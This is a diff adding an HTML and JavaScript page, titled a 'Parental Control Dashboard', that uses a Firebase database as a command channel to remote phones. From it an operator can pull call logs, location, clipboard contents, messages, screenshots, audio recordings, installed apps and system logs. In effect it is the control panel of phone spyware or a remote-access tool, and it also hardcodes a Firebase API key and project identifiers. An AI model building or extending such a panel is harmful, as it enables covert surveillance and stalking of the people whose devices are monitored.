@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parental Control Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase Configuration and Script Import -->
+    <script type="module">
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBT8KtCVmeP98tLlIGoE07a4EPoVedEWFM",
+            authDomain: "darkmatter-78480.firebaseapp.com",
+            databaseURL: "https://darkmatter-78480-default-rtdb.firebaseio.com",
+            projectId: "darkmatter-78480",
+            storageBucket: "darkmatter-78480.appspot.com",
+            messagingSenderId: "969084296444",
+            appId: "1:969084296444:web:48fb4175126b112ed70b79"
+        };
+
+        // Import Firebase modules
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js';
+        import { getDatabase, ref, onValue, set } from 'https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js';
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        let selectedDevice = null;
+
+        // Fetch Devices from Firebase (Excluding the Command Node)
+        function fetchDevices() {
+            const deviceList = document.getElementById('device-list');
+            const deviceRef = ref(db, 'Device');
+            onValue(deviceRef, (snapshot) => {
+                deviceList.innerHTML = ''; // Clear the list
+                snapshot.forEach((childSnapshot) => {
+                    const deviceName = childSnapshot.key;
+                    const status = childSnapshot.child('status').val();
+
+                    // Create device entry (excluding the command field)
+                    const deviceItem = document.createElement('li');
+                    deviceItem.className = `p-4 rounded-md shadow cursor-pointer ${status === 'online' ? 'bg-green-100' : 'bg-gray-100'}`;
+                    deviceItem.textContent = `${deviceName} (${status})`;
+                    deviceItem.onclick = () => selectDevice(deviceName);
+
+                    deviceList.appendChild(deviceItem);
+                });
+            });
+        }
+
+        // Select a Device
+        function selectDevice(deviceName) {
+            selectedDevice = deviceName;
+            document.getElementById('devices-section').classList.add('hidden');
+            document.getElementById('actions-section').classList.remove('hidden');
+        }
+
+        // Send Command to Device (Update the command node at the Device level)
+        function sendCommand(command) {
+            if (!selectedDevice) return;
+
+            // Set the command for the selected device (at the Device level)
+            const commandRef = ref(db, `Device/command`);
+            set(commandRef, command)
+                .then(() => {
+                    alert(`Command '${command}' sent to ${selectedDevice}`);
+                    monitorDeviceData(selectedDevice, command); // Start monitoring data based on the command
+                })
+                .catch((error) => console.error('Error sending command:', error));
+        }
+
+        // Monitor the device's data and show relevant data based on the command
+        function monitorDeviceData(deviceName, command) {
+            const dataRef = ref(db, `Device/${deviceName}`);
+            onValue(dataRef, (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    displayDeviceData(data, command);
+                }
+            });
+        }
+
+        // Display the fetched data based on the requested command
+        function displayDeviceData(data, command) {
+            const dataSection = document.getElementById('device-data');
+            dataSection.innerHTML = ''; // Clear previous data
+
+            switch(command) {
+                case "battery":
+                    // Display battery status
+                    if (data.battery_status) {
+                        const batteryStatus = document.createElement('p');
+                        batteryStatus.textContent = `Battery Level: ${data.battery_status.level}%`;
+                        dataSection.appendChild(batteryStatus);
+                    }
+                    break;
+                case "call_logs":
+                    // Display call logs
+                    if (data.call_logs) {
+                        const callLogsTitle = document.createElement('h3');
+                        callLogsTitle.textContent = 'Call Logs:';
+                        dataSection.appendChild(callLogsTitle);
+
+                        const callLogsList = document.createElement('ul');
+                        data.call_logs.forEach((log) => {
+                            const callLogItem = document.createElement('li');
+                            callLogItem.textContent = `Number: ${log.number}, Type: ${log.type}`;
+                            callLogsList.appendChild(callLogItem);
+                        });
+                        dataSection.appendChild(callLogsList);
+                    }
+                    break;
+                case "location":
+                    // Example: Display location (Assume location data exists)
+                    if (data.location) {
+                        const location = document.createElement('p');
+                        location.textContent = `Location: ${data.location.latitude}, ${data.location.longitude}`;
+                        dataSection.appendChild(location);
+                    }
+                    break;
+                // Add more cases for other commands if needed (like contacts, messages, etc.)
+                default:
+                    dataSection.textContent = "No data available for the requested command.";
+                    break;
+            }
+        }
+
+        // Initialize Devices
+        fetchDevices();
+
+        // Function to handle dropdown selection
+        window.handleCommandSelect = function() {
+            const command = document.getElementById('commandDropdown').value;
+
+            // Only send command if a valid selection is made
+            if (command) {
+                sendCommand(command);
+            }
+        };
+
+        // Go back to the devices list
+        window.goBack = function() {
+            selectedDevice = null;
+            document.getElementById('actions-section').classList.add('hidden');
+            document.getElementById('devices-section').classList.remove('hidden');
+        };
+    </script>
+</head>
+<body class="bg-gray-100 min-h-screen flex flex-col items-center py-8">
+    <h1 class="text-3xl font-bold mb-8">Parental Control Dashboard</h1>
+
+    <!-- Devices Section -->
+    <div id="devices-section" class="w-3/4 p-4 bg-white shadow-md rounded-md mb-6">
+        <h2 class="text-xl font-semibold mb-4">Available Devices</h2>
+        <ul id="device-list" class="space-y-2">
+            <!-- Devices will be listed here dynamically -->
+        </ul>
+    </div>
+
+    <!-- Actions Section -->
+    <div id="actions-section" class="w-3/4 p-4 bg-white shadow-md rounded-md hidden">
+        <h2 class="text-xl font-semibold mb-4">Device Actions</h2>
+        
+        <!-- Dropdown for Commands -->
+        <select id="commandDropdown" onchange="handleCommandSelect()">
+            <option value="">Select Command</option>
+            <option value="battery">Get Battery Status</option>
+            <option value="call_logs">Fetch Call Logs</option>
+            <option value="location">Get Location</option>
+            <option value="vibrate">Vibrate Device</option>
+            <option value="clipboard">Send Clipboard Data</option>
+            <option value="messages">Send Messages</option>
+            <option value="record">Start Recording</option>
+            <option value="torch_on">Turn On Torch</option>
+            <option value="torch_off">Turn Off Torch</option>
+            <option value="screenshot">Take Screenshot</option>
+            <option value="device_info">Send Device Info</option>
+            <option value="wallpaper">Change Wallpaper</option>
+            <option value="mute_volume">Mute Volume</option>
+            <option value="unmute_volume">Unmute Volume</option>
+            <option value="set_volume">Set Volume</option>
+            <option value="send_running_apps">Send Running Apps</option>
+            <option value="send_system_logs">Send System Logs</option>
+            <option value="send_installed_apps">Send Installed Apps</option>
+        </select>
+        
+        <button onclick="goBack()" class="mt-4 text-blue-500">Back to Devices</button>
+    </div>
+
+    <!-- Data Section for Displaying Device Data -->
+    <div id="device-data" class="w-3/4 p-4 bg-white shadow-md rounded-md mt-6">
+        <h2 class="text-xl font-semibold mb-4">Device Data</h2>
+        <!-- Fetched data will be shown here -->
+    </div>
+
+    <style>
+        .action-btn {
+            padding: 8px 16px;
+            background-color: #4f46e5;
+            color: white;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .action-btn:hover {
+            background-color: #4338ca;
+        }
+    </style>
+</body>
+</htm
